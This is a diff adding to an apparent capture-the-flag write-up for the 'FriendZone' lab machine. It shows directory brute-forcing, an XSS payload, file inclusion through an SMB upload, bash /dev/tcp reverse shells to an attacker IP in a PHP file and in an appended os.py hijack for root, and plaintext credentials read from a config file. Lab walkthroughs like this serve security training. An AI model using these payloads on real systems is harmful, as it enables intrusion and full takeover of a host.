@@ -323,12 +323,19 @@ Final Access timestamp is 1677335106
 #### gobuster
 
 ```
-
+gobuster dir -u https://administrator1.friendzone.red/ --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -k -t 150
+/images         
 ```
 
 try php as well
 ```
+gobuster dir -u https://administrator1.friendzone.red/ --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -k -x php -t 150
 
+/.php                 (Status: 403) [Size: 309]
+/images               (Status: 301) [Size: 349] [--> https://administrator1.friendzone.red/images/]
+/dashboard.php        (Status: 200) [Size: 101]
+/login.php            (Status: 200) [Size: 7]
+/timestamp.php        (Status: 200) [Size: 36]
 ```
 ### hr.friendzone.red
 ![[Pasted image 20230225213527.png]]
@@ -349,3 +356,224 @@ admin:WORKWORKHhallelujah@#
 ### vpn.friendzoneportal.red
 404
 
+
+# Foothold
+## playing with parameters
+
+```
+view-source:https://administrator1.friendzone.red/dashboard.php?image_id=d.jpg
+<img src='images/d.jpg'>
+```
+
+## trying xss
+This works
+```
+a.jpg'><script>alert('xss')</script>
+```
+
+```
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg%27%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+```
+
+![[Pasted image 20230225230504.png]]
+
+## second parameter
+
+Visit
+`//administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp`
+
+![[Pasted image 20230225230947.png]]
+
+Is the bottom side showing the php folder?
+![[Pasted image 20230225231022.png]]
+#### /dashboard.php?image_id=a.jpg&pagename=login
+![[Pasted image 20230225231100.png]]
+maybe we can move around in directory?
+
+### look for other php files
+
+uploads.friendzone.red/upload.php
+![[Pasted image 20230225231506.png]]
+```
+curl https://uploads.friendzone.red/upload.php -k  
+WHAT ARE YOU TRYING TO DO HOOOOOOMAN ! 
+```
+
+admin.friendzoneportal.red/login.php
+
+![[Pasted image 20230225231606.png]]
+
+curl https://admin.friendzone.red/login.php -k
+Redirecting                                                                                                                                                  
+
+### gobuster again
+```
+gobuster dir -u https://uploads.friendzone.red/ --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -k -t 150
+
+```
+
+
+## Uploading files
+
+![[Pasted image 20230226002303.png]]
+Files share is under /etc/Files, so probably /etc/Development/files if we upload something
+
+```test.php                                             
+<?php echo 'test'; ?>
+```
+Upload this file
+
+```
+smbclient -N //friendzone.htb/Development   
+Try "help" to get a list of possible commands.
+smb: \> put test.php
+putting file test.php as \test.php (0.0 kb/s) (average 0.0 kb/s)
+smb: \> ls
+  .                                   D        0  Sat Feb 25 09:39:48 2023
+  ..                                  D        0  Tue Sep 13 10:56:24 2022
+  test.php                            A       22  Sat Feb 25 09:39:49 2023
+
+                3545824 blocks of size 1024. 1537504 blocks available
+```
+
+
+Revisit the page
+```
+https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&pagename=/etc/Development/test
+```
+
+![[Pasted image 20230226002445.png]]
+
+We could display test string
+
+## Reverse shell
+put revshell
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+```
+smbclient -N //friendzone.htb/Development   
+Try "help" to get a list of possible commands.
+smb: \> put revshell.php
+cli_push returned NT_STATUS_IO_TIMEOUT
+```
+
+```revshell.php
+cat revshell.php
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.26/1234 0>&1'");?>
+```
+
+```
+https://administrator1.friendzone.red/dashboard.php?image_id=1.jpg&pagename=/etc/Development/revshell
+```
+
+```
+nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.26] from (UNKNOWN) [10.129.209.64] 52178
+bash: cannot set terminal process group (750): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@FriendZone:/var/www/admin$ 
+```
+
+## Flag
+```
+www-data@FriendZone:/home/friend$ cat user.txt
+cat user.txt
+```
+
+# Privilege escalation
+
+## Enumeration
+
+### Upgrade shell
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+### www-data to friend
+mysql_data.conf
+```
+www-data@FriendZone:/var/www$ cat mysql_data.conf
+cat mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+```
+
+su friend with the password above.
+
+### sudo -l
+
+```
+friend@FriendZone:/var/www$ sudo -l
+sudo -l
+[sudo] password for friend: Agpyu12!0.213$
+
+Sorry, user friend may not run sudo on FriendZone.
+```
+
+or we can ssh to friend
+
+### python
+```
+friend@FriendZone:/opt/server_admin$ cat reporter.py
+#!/usr/bin/python
+
+import os
+
+to_address = "admin1@friendzone.com"
+from_address = "admin2@friendzone.com"
+
+print "[+] Trying to send email to %s"%to_address
+
+#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+```
+
+```
+friend@FriendZone:/usr/lib/python2.7$ ls -la |grep os
+-rwxr-xr-x  1 root   root     4635 Apr 16  2018 os2emxpath.py
+-rwxr-xr-x  1 root   root     4507 Oct  6  2018 os2emxpath.pyc
+-rwxrwxrwx  1 root   root    25910 Jan 15  2019 os.py
+-rw-rw-r--  1 friend friend  25583 Jan 15  2019 os.pyc
+-rwxr-xr-x  1 root   root    19100 Apr 16  2018 _osx_support.py
+-rwxr-xr-x  1 root   root    11720 Oct  6  2018 _osx_support.pyc
+-rwxr-xr-x  1 root   root     8003 Apr 16  2018 posixfile.py
+-rwxr-xr-x  1 root   root     7628 Oct  6  2018 posixfile.pyc
+-rwxr-xr-x  1 root   root    13935 Apr 16  2018 posixpath.py
+-rwxr-xr-x  1 root   root    11385 Oct  6  2018 posixpath.pyc
+```
+os.py has permission
+
+### pspy
+check cron
+
+append revshell at the end so it becomes something like this.
+```os.py
+...
+try:
+    _copy_reg.pickle(statvfs_result, _pickle_statvfs_result,
+                     _make_statvfs_result)
+except NameError: # statvfs_result may not exist
+    pass
+
+import os
+os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.26/1234 0>&1'")
+```
+
+```
+nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.26] from (UNKNOWN) [10.129.209.64] 52496
+bash: cannot set terminal process group (4972): Inappropriate ioctl for device
+bash: no job control in this shell
+root@FriendZone:~# 
+```
